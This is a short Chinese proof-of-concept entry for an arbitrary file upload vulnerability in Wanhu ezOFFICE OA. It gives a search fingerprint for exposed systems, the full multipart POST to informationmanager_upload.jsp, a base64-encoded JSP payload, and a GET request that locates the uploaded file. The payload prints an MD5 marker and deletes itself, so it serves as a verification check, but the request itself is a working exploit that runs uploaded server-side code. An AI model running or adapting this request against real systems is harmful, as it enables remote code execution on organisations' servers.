# 万户OAinformationmanager_upload.jsp存在任意文件上传漏洞

- **系统**：万户　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="万户ezOFFICE协同管理平台"`
- **请求**：`POST /defaultroot/information_manager/informationmanager_upload.jsp?upload=1&dispControl=null&saveControl=null HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk…`

**请求体 / payload**
```
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file1"; filename="tttesttt.jsp"
Content-Type: application/octet-stream
PCUgb3V0LnByaW50bG4oIjIwMmNiOTYyYWM1OTA3NWI5NjRiMDcxNTJkMjM0YjcwIik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg==
------WebKitFormBoundary7MA4YWxkTrZu0gW--
**上传定位：**
GET /defaultroot/upload/information/第一个响应中的filename HTTP/1.1
Host:
```
- **预期**：200　|　202cb962ac59075b964b07152d234b70